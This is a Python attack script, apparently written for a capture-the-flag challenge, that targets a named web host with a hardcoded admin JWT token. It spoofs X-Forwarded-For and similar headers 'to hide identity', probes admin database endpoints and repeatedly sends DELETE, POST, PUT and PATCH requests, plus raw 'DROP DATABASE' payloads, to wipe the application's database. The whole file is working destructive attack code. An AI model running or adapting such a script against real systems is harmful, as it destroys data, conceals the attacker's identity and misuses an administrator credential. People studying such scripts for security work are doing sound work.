#!/usr/bin/env python3
"""
Anonymous Database Deletion Script
Hides IP address and deletes database to get flag
"""

import requests
import json

class AnonymousDBDeleter:
    def __init__(self, base_url, token):
        self.base_url = base_url.rstrip('/')
        self.token = token
        self.session = requests.Session()
        self.headers = {
            "Authorization": f"Bearer {token}",
            # Spoof headers to hide identity
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "X-Forwarded-For": "127.0.0.1",  # Spoof IP
            "X-Real-IP": "127.0.0.1",
            "X-Originating-IP": "127.0.0.1",
            "X-Remote-IP": "127.0.0.1",
            "X-Remote-Addr": "127.0.0.1",
        }
        
    def find_database_endpoints(self):
        """Find database-related endpoints"""
        print("\n[*] Searching for database endpoints...")
        
        db_endpoints = [
            '/api/admin/database',
            '/api/admin/db',
            '/api/admin/database/delete',
            '/api/admin/db/delete',
            '/api/admin/database/drop',
            '/api/admin/db/drop',
            '/api/admin/database/clear',
            '/api/admin/db/clear',
            '/api/admin/database/reset',
            '/api/admin/db/reset',
            '/api/admin/database/wipe',
            '/api/database/delete',
            '/api/db/delete',
        ]
        
        found_endpoints = []
        
        for endpoint in db_endpoints:
            url = f"{self.base_url}{endpoint}"
            try:
                # Try GET first
                resp = self.session.get(url, headers=self.headers, timeout=5)
                if resp.status_code != 404:
                    print(f"[+] Found: {endpoint} (GET: {resp.status_code})")
                    found_endpoints.append((endpoint, 'GET', resp.status_code))
                
                # Try DELETE method
                resp = self.session.delete(url, headers=self.headers, timeout=5)
                if resp.status_code != 404:
                    print(f"[+] Found: {endpoint} (DELETE: {resp.status_code})")
                    found_endpoints.append((endpoint, 'DELETE', resp.status_code))
                    
            except Exception as e:
                pass
        
        return found_endpoints
    
    def attempt_database_deletion(self):
        """Try various methods to delete the database"""
        print("\n" + "="*60)
        print("ATTEMPTING DATABASE DELETION")
        print("="*60)
        
        # Method 1: Direct DELETE request
        print("\n[1] Trying DELETE request on /api/admin/database...")
        try:
            url = f"{self.base_url}/api/admin/database"
            resp = self.session.delete(url, headers=self.headers, timeout=10)
            print(f"Status: {resp.status_code}")
            print(f"Response: {resp.text}")
            
            if resp.status_code == 200:
                print("[!!!] DATABASE DELETED!")
                return True, resp.text
                
        except Exception as e:
            print(f"Error: {e}")
        
        # Method 2: POST with delete action
        print("\n[2] Trying POST with delete action...")
        try:
            url = f"{self.base_url}/api/admin/database"
            data = {"action": "delete"}
            resp = self.session.post(url, json=data, headers=self.headers, timeout=10)
            print(f"Status: {resp.status_code}")
            print(f"Response: {resp.text}")
            
            if resp.status_code == 200:
                print("[!!!] DATABASE DELETED!")
                return True, resp.text
                
        except Exception as e:
            print(f"Error: {e}")
        
        # Method 3: Try /api/admin/db
        print("\n[3] Trying DELETE on /api/admin/db...")
        try:
            url = f"{self.base_url}/api/admin/db"
            resp = self.session.delete(url, headers=self.headers, timeout=10)
            print(f"Status: {resp.status_code}")
            print(f"Response: {resp.text}")
            
            if resp.status_code == 200:
                print("[!!!] DATABASE DELETED!")
                return True, resp.text
                
        except Exception as e:
            print(f"Error: {e}")
        
        # Method 4: Try with query parameter
        print("\n[4] Trying with query parameter...")
        try:
            url = f"{self.base_url}/api/admin/database?action=delete"
            resp = self.session.delete(url, headers=self.headers, timeout=10)
            print(f"Status: {resp.status_code}")
            print(f"Response: {resp.text}")
            
            if resp.status_code == 200:
                print("[!!!] DATABASE DELETED!")
                return True, resp.text
                
        except Exception as e:
            print(f"Error: {e}")
        
        # Method 5: Try PUT method
        print("\n[5] Trying PUT method...")
        try:
            url = f"{self.base_url}/api/admin/database"
            data = {"action": "delete", "confirm": True}
            resp = self.session.put(url, json=data, headers=self.headers, timeout=10)
            print(f"Status: {resp.status_code}")
            print(f"Response: {resp.text}")
            
            if resp.status_code == 200:
                print("[!!!] DATABASE DELETED!")
                return True, resp.text
                
        except Exception as e:
            print(f"Error: {e}")
        
        # Method 6: Try PATCH method
        print("\n[6] Trying PATCH method...")
        try:
            url = f"{self.base_url}/api/admin/database"
            data = {"operation": "delete"}
            resp = self.session.patch(url, json=data, headers=self.headers, timeout=10)
            print(f"Status: {resp.status_code}")
            print(f"Response: {resp.text}")
            
            if resp.status_code == 200:
                print("[!!!] DATABASE DELETED!")
                return True, resp.text
                
        except Exception as e:
            print(f"Error: {e}")
        
        # Method 7: Try /api/database (without admin)
        print("\n[7] Trying /api/database...")
        try:
            url = f"{self.base_url}/api/database"
            resp = self.session.delete(url, headers=self.headers, timeout=10)
            print(f"Status: {resp.status_code}")
            print(f"Response: {resp.text}")
            
            if resp.status_code == 200:
                print("[!!!] DATABASE DELETED!")
                return True, resp.text
                
        except Exception as e:
            print(f"Error: {e}")
        
        # Method 8: Try SQL injection to drop database
        print("\n[8] Trying SQL injection to drop database...")
        try:
            url = f"{self.base_url}/api/admin/database"
            payloads = [
                {"query": "DROP DATABASE IF EXISTS tasktrack;"},
                {"sql": "DROP DATABASE tasktrack;"},
                {"command": "DROP DATABASE tasktrack;"},
            ]
            
            for payload in payloads:
                resp = self.session.post(url, json=payload, headers=self.headers, timeout=10)
                print(f"Payload: {payload}")
                print(f"Status: {resp.status_code}")
                if resp.status_code == 200:
                    print(f"Response: {resp.text}")
                    print("[!!!] DATABASE DELETED!")
                    return True, resp.text
                    
        except Exception as e:
            print(f"Error: {e}")
        
        return False, None
    
    def check_for_flag(self):
        """Check various endpoints for the flag"""
        print("\n" + "="*60)
        print("CHECKING FOR FLAG")
        print("="*60)
        
        flag_endpoints = [
            '/api/admin/flag',
            '/api/flag',
            '/api/admin/database',
            '/api/admin',
            '/flag',
            '/admin/flag',
            '/api/admin/success',
            '/api/success',
        ]
        
        for endpoint in flag_endpoints:
            url = f"{self.base_url}{endpoint}"
            try:
                resp = self.session.get(url, headers=self.headers, timeout=5)
                print(f"\n{endpoint}: {resp.status_code}")
                
                if resp.status_code == 200:
                    print(f"Response: {resp.text}")
                    
                    # Check if response contains flag pattern
                    if 'flag' in resp.text.lower() or 'ethara' in resp.text.lower():
                        print("[!!!] POSSIBLE FLAG FOUND!")
                        
            except Exception as e:
                pass
    
    def run_full_attack(self):
        """Run complete attack"""
        print("="*60)
        print("ANONYMOUS DATABASE DELETION ATTACK")
        print(f"Target: {self.base_url}")
        print("="*60)
        print("\n[*] Using IP spoofing headers to hide identity")
        print("[*] X-Forwarded-For: 127.0.0.1")
        print("[*] X-Real-IP: 127.0.0.1")
        
        # Find endpoints
        self.find_database_endpoints()
        
        # Attempt deletion
        success, response = self.attempt_database_deletion()
        
        if success:
            print("\n" + "="*60)
            print("DATABASE DELETION SUCCESSFUL!")
            print("="*60)
            print(f"\nResponse: {response}")
            
            # Check for flag
            self.check_for_flag()
        else:
            print("\n[-] Database deletion failed with all methods")
            print("[*] Checking for flag anyway...")
            self.check_for_flag()

if __name__ == "__main__":
    target = "http://fresh-start-267.emergent.host"
    admin_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYTcyMWZjYzEtMTk5OS00NGViLWJjOTQtMDU0YjU4N2E2MDUzIiwiZW1haWwiOiJhZG1pbkBldGhhcmEuYWkiLCJuYW1lIjoiU3lzdGVtIEFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzc3NTMzMTI2fQ.Lu6aYqa4j4EQHX463APGH0n73p_ziCQn3luWUSi-61U"
    
    deleter = AnonymousDBDeleter(target, admin_token)
    deleter.run_full_attack()
